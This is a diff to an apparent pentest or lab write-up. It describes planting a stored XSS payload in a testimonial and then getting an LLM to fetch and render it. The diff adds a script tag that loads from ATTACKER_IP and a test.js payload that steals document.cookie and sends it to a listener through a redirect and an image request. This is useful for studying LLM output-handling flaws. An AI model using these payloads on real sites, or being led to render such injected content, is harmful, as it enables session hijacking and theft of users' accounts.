@@ -68,9 +68,15 @@ More realistic scenario: the LLM has access to stored content (testimonials, com
 2. **Inject payload into stored content** (e.g., create a testimonial):
    Create a new testimonial with the content
    ```
-   <script src="http://ATTACKER_IP:8000/evil.js"></script>
+   <script src="http://ATTACKER_IP:8000/test.js"></script>
    ```
    > Use a remote script src - much easier to update the payload later without needing to re-inject.
+
+   test.js paylod
+   ```
+   document.location = "http://127.0.0.1:8000/test.js?c="+btoa(document.cookie);
+   new Image().src='http://127.0.0.1:8000/test.js?c='+document.cookie;
+   ```
 
 3. **Trigger the LLM to fetch and render it:**
    ```
